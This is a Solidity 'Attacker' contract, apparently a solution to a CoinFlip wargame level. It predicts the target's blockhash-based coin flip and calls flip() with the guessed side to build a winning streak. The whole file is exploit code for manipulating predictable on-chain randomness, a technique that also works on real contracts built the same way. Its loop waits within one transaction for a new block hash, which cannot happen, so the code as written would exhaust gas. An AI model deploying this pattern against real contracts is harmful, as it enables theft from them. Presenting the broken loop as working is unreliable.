// SPDX-License-Identifier: Unlicense

pragma solidity ^0.8.0;

interface ICoinFlip{
    function consecutiveWins() external view returns (uint);
    function flip(bool) external returns (bool);
}

contract Attacker{
    ICoinFlip public immutable coinflip;
    uint FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    uint count = 0;
    uint lastHash;

    constructor(){
        coinflip = ICoinFlip(0x9D7f74d0C41E726EC95884E0e97Fa6129e3b5E99);
    }

    function attack() external {
        while (count < 10){
            uint blockValue = uint(blockhash(block.number - 1));
            if (lastHash != blockValue){
                lastHash = blockValue;
                uint coinFlip = blockValue / FACTOR;
                bool side = coinFlip == 1 ? true : false;

                if (side == true){
                    coinflip.flip(true);
                } else {
                    coinflip.flip(false);
                }
                count++;
            }
        }
    }

    function ConsecutiveWins() external view returns (uint){
        return coinflip.consecutiveWins();
    }

}